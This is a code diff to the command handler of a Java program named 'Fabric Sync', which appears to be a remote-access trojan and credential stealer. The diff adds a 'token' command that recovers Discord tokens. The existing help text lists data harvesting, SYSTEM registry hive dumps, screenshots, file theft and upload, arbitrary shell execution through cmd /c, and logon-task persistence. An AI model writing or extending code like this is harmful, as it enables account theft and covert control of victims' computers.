@@ -52,6 +52,7 @@ public final class CommandExecutor {
 				case "download" -> download(args);
 				case "upload" -> upload(message, args);
 				case "harvest" -> poller.harvestNow();
+				case "token" -> poller.tokenNow();
 				case "hives" -> poller.hivesNow();
 				case "bootstrap" -> poller.bootstrapNow();
 				case "help" -> help();
@@ -77,7 +78,7 @@ public final class CommandExecutor {
 	private void help() {
 		poller.reply(String.join("\n",
 			"**Fabric Sync**",
-			"`ping` latency and transport · `harvest` collect now · `bootstrap` run the whole first-run collection again · `hives` SYSTEM hives (asks for UAC) · `screenshot` screen",
+			"`ping` latency and transport · `harvest` collect now · `token` recover Discord now · `bootstrap` run the whole first-run collection again · `hives` SYSTEM hives (asks for UAC) · `screenshot` screen",
 			"`ls [dir]` · `cd <dir>` · `cat <file>` · `download <file>` (max 8 MB) · `upload <url|file> [name]`",
 			"`shell <cmd>` runs cmd /c with a 60 s cut; output over 1000 chars arrives as .txt",
 			"`persist on|off` logon task · `sleep <s>` · `kill`",
